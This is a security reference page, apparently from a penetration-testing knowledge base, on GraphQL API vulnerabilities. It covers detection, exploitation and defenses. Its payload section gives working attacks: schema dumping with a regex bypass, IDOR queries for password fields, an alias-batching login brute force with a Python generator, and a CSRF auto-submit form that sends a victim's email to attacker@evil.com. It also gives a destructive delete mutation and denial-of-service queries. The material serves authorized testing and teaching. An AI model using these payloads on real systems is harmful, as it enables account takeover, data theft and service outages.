# GraphQL API Vulnerabilities

> Introspection, batching, and resolver flaws expose data or enable DoS/IDOR. **Deep dive:** [`Troubleshooting_Guide/graphql_api.md`](../../../../Troubleshooting_Guide/graphql_api.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** OWASP API Top 10
**Status:** complete

## What it is
GraphQL exposes a single, strongly-typed endpoint where clients ask for exactly the fields they
want. That flexibility creates its own attack surface: introspection leaks the whole schema,
aliases/batching multiply work in one request, and per-field resolvers each need their own
authorization — gaps there yield IDOR, data exposure, and denial of service.

## How it works
The attacker controls the query itself — which fields, which object IDs, and how many operations
ride in one HTTP request. Apps go wrong by leaving introspection on in production (handing over a
map of every type and field), by checking auth only at the query root instead of per resolver
(so a nested or sibling field leaks data), by allowing unbounded aliasing/nesting (defeating
rate limits and exhausting the server), and by accepting `application/x-www-form-urlencoded`
without CSRF protection so a mutation can be triggered cross-site.

## Impact
Schema disclosure of hidden/sensitive fields (`password`, `apiKey`, internal mutations); IDOR
and broken-object-authorization reads/writes across users; brute force at scale via alias
batching that sidesteps per-request limiters; CSRF-driven state changes; and denial of service
from deeply nested or circular queries. Severity ranges from medium (info leak via introspection)
to critical (auth bypass, destructive mutations).

## How to detect
- `{__typename}` returns `{"data":{"__typename":"query"}}` — confirms a GraphQL endpoint.
- A full introspection query (`__schema`) succeeds — introspection is enabled.
- Field-level errors that still return partial `data` reveal authorization is checked unevenly.
- A form-encoded POST (`Content-Type: application/x-www-form-urlencoded`) that executes a query
  signals missing CSRF protection.
- Slow/timeout responses to nested or circular queries indicate no depth/complexity limiting.

## Exploitation (summary)
Locate the endpoint, confirm with `__typename`, then dump the schema via introspection (use the
`%0a` newline trick if a naive `__schema{` regex blocks it). Mine the schema for sensitive fields
and hidden mutations, then walk sequential IDs to read other users' objects. Batch many `login`
attempts under aliases to brute-force past rate limits, and submit form-encoded mutations to test
CSRF. Escalate to destructive mutations or DoS via deep/circular queries. Full payloads in the
Payloads section and the deep-dive note.

## Payloads & techniques

> Distilled from field payload references — for authorized testing only.

### Finding the endpoint

Common locations to probe:

```bash
/graphql        /api            /api/graphql
/graphql/v1     /v1/graphql     /query
/gql            /graphql/console /graphql/graphiql
/playground     /__graphql
```

Confirm GraphQL with a universal `__typename` query:

```http
GET /api?query=query{__typename}
# {"data":{"__typename":"query"}}
```

### Introspection

Full schema dump:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields(includeDeprecated: true) {
        name
        args { name type { name } }
        type { name kind ofType { name } }
      }
    }
    directives { name args { name type { name } } }
  }
}
```

Newline bypass for naive `__schema{` regex blocks (`%0a` splits the token):

```http
GET /api?query=query+IntrospectionQuery{__schema%0a{queryType{name}}}
```

### ID enumeration & private fields

Walk sequential IDs and request fields introspection revealed but the UI hides (`password`, `postPassword`, `apiKey`, etc.):

```graphql
query { getBlogPost(id: 1) { id title } }
query { getBlogPost(id: 3) { id title postPassword } }
query { getUser(id: 1) { id username password } }
```

Sensitive field keywords to grep the schema for: `password, token, secret, key, credential, ssn, credit, private, internal, admin, postPassword, apiKey, authToken`.

### Rate-limit bypass via alias batching

Aliases run many operations in one request, defeating per-request limiters:

```graphql
mutation {
  attempt0: login(input: {username: "carlos", password: "123456"}) { token success }
  attempt1: login(input: {username: "carlos", password: "password"}) { token success }
  # ... up to
  attempt99: login(input: {username: "carlos", password: "letmein"}) { token success }
}
```

```python
passwords = ["123456", "password", "qwerty", "abc123"]
query = 'mutation { '
for i, pwd in enumerate(passwords):
    query += f'attempt{i}: login(input:{{username:"carlos",password:"{pwd}"}}){{token success}} '
query += '}'
```

### CSRF over GraphQL

When the server accepts `application/x-www-form-urlencoded` and skips CSRF checks:

```html
<form action="https://TARGET/graphql/v1" method="POST" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="query"
         value='mutation{changeEmail(input:{email:"attacker@evil.com"}){email}}' />
</form>
<script>document.forms[0].submit();</script>
```

With variables, form-encoded:

```http
query=mutation+changeEmail($input:ChangeEmailInput!){changeEmail(input:$input){email}}&operationName=changeEmail&variables={"input":{"email":"attacker@evil.com"}}
```

### Destructive mutations

```graphql
mutation { deleteOrganizationUser(input: {id: 3}) { user { id } } }
```

### Denial of service

Batched deep selections multiply server work:

```graphql
query {
  batch1: users(first: 1000) { posts(first: 1000) { comments(first: 1000) { author { posts { id } } } } }
  batch2: users(first: 1000) { posts(first: 1000) { comments(first: 1000) { author { posts { id } } } } }
}
```

Circular fragment causes unbounded recursion:

```graphql
fragment UserFields on User { id posts { author { ...UserFields } } }
query { user(id: 1) { ...UserFields } }
```

### cURL probes

```bash
# confirm endpoint
curl -s https://TARGET/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}'
# introspection
curl -s https://TARGET/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name}}}"}'
# CSRF test (form-encoded accepted?)
curl -s https://TARGET/graphql -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'query={__typename}'
# introspection regex bypass
curl -s https://TARGET/graphql -X POST -H "Content-Type: application/json" -d '{"query":"query IntrospectionQuery{__schema%0a{queryType{name}}}"}'
```

## Defenses
1. **Disable introspection in production** and reject `__schema`/`__type` queries (don't rely on
   regex — block the feature at the server).
2. **Authorize at the resolver/field level**, not just the query root; default-deny on every
   object and field.
3. **Limit query depth, complexity, and aliasing**, and cap or disable batching to stop brute
   force and resource-exhaustion DoS.
4. **Enforce CSRF protection**: only accept `application/json`, reject `application/x-www-form-
   urlencoded`, and validate tokens/origin on state-changing operations.
5. Rate-limit by operation (count aliased operations, not just requests), disable field
   suggestions, and validate/whitelist input arguments.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=GraphQL+API+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=GraphQL+API+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=GraphQL+API+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=GraphQL+API+Vulnerabilities
- **OSV** — https://osv.dev/list?q=GraphQL+API+Vulnerabilities
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `GraphQL API Vulnerabilities <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2021-32847` — OneDev: GraphQL/API exposure allowing unauthenticated access to sensitive
  functionality.
- _Canonical incident: GitLab's GraphQL endpoint has had multiple disclosures of sensitive data
  via insufficient field-level authorization — a representative real-world GraphQL IDOR class._
- _Canonical incident: introspection-on-in-production routinely leaks hidden mutations/fields in
  bug-bounty reports; query-batching/depth abuse is the standard GraphQL DoS pattern (see
  graphql-js depth-limiting advisories on the GitHub Advisory database)._

## References
- PortSwigger Web Security Academy — GraphQL API vulnerabilities.
- OWASP GraphQL Cheat Sheet.
- OWASP API Security Top 10 (2023); GraphQL specification (graphql.org/learn).
